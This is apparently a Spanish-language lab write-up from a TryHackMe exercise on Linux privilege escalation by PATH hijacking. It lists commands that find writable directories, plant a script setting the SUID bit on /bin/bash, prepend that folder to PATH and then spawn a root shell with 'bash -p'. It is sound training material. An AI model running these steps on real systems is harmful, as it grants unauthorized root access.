# Path

Si en la ruta se encuentra una carpeta para la cual su usuario tiene permiso de escritura, podría secuestrar una aplicación para ejecutar un script. PATH en Linux es una variable ambiental que le dice al sistema operativo dónde buscar ejecutables. Para cualquier comando que no esté integrado en el shell o que no esté definido con una ruta absoluta, Linux comenzará a buscar en las carpetas definidas en PATH. (PATH es la variable ambiental de la que estamos hablando aquí, ruta es la ubicación de un archivo).

```shell
karen@ip-10-10-202-24:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```
find / -writable 2>/dev/null
```

```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

<figure><img src="../../.gitbook/assets/20231008175337.png" alt=""><figcaption></figcaption></figure>

```
home/murdoch
```

<figure><img src="../../.gitbook/assets/20231008181046.png" alt=""><figcaption></figcaption></figure>

```
karen@ip-10-10-202-24:/tmp/tmp.pYUM27Y7zs$ echo 'chmod +s /bin/bash' > thm
```

```shell
karen@ip-10-10-202-24:/tmp/tmp.pYUM27Y7zs$ cat thm 
#!/bin/bash
chmod +s /bin/bash
```

```shell
karen@ip-10-10-202-24:/tmp/tmp.pYUM27Y7zs$ export PATH=/tmp/tmp.pYUM27Y7zs:$PATH
```

<figure><img src="../../.gitbook/assets/20231008182441.png" alt=""><figcaption></figcaption></figure>

```
bash -p
```

<figure><img src="../../.gitbook/assets/20231008182536.png" alt=""><figcaption></figcaption></figure>
